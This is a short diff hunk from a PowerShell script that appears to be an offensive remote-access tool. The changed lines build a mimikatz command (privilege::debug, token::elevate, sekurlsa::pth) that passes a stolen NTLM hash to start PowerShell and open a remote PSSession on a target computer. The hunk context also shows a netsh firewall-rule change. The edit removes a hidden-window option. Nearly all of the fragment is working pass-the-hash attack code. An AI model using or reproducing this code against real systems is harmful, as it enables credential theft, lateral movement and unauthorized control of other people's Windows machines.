@@ -176,8 +176,8 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
 
    $Host.UI.RawUI.ForegroundColor = 'Gray'
    if(Test-Path variable:PassTheHash) { $computer = powershell "(Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value' | select -First 1).split(':')[1].trim()"
-   $RDP = "New-PSSession -Computer $computer"
-   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` -WindowStyle` Hidden` $RDP' exit"
+   $PTH = "`$RDP = New-PSSession -Computer $computer"
+   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $PTH' exit"
    powershell $mimipath\mimikatz.exe $cmd ; Write-Host "" ; del file.txt }
    
    else { Write-Host ""
